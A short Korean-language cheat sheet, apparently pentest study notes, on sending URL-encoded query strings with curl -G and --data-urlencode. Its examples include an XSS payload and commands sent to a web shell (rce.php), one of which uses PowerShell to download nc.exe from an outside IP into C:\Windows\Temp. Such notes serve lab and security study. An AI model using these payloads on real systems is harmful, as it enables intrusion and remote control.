# curl 쿼리스트링 전송과 URL 인코딩

## -G와 --data-urlencode

```bash
# -G: --data/--data-urlencode 데이터를 POST 본문 대신 URL 쿼리스트링에 붙여 GET 요청으로 보낸다
curl -G "http://target.com/search.php" --data-urlencode "q=<script>alert(1)</script>"
# 실제 전송: /search.php?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

# 파라미터가 여러 개면 --data-urlencode를 나열한다
curl -G "http://target.com/rce.php" --data-urlencode "cmd=whoami" --data-urlencode "opt=/all"
```

- `--data-urlencode`는 공백, `<`, `>`, `"`, `&`, `|`, `;` 등을 전부 퍼센트 인코딩으로 바꿔준다
- `-G`를 빼면 같은 데이터가 POST 본문으로 전송된다

## 수동 %20 치환의 한계

```bash
# 공백만 %20으로 바꿔 보내는 방식
curl "http://target.com/rce.php?cmd=powershell%20-c%20iwr%20-uri%20http://192.168.45.156/nc.exe%20-Outfile%20C:\Windows\Temp\nc.exe"
```

- 특수문자가 공백 수준이면 동작하지만, 명령에 큰따옴표·파이프(`|`)·`&`·`>`가 섞이는 순간 전부 커버하지 못한다
- 그 지점부터는 `-G` + `--data-urlencode`가 정답이다
- base64 페이로드의 `+`, `/`, `=`도 URL에서 특수 취급된다. raw로 붙이면 `+`가 공백으로 해석되는 등 페이로드가 훼손된다

## 인코딩 결과 확인

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(1)</script>'))"
```
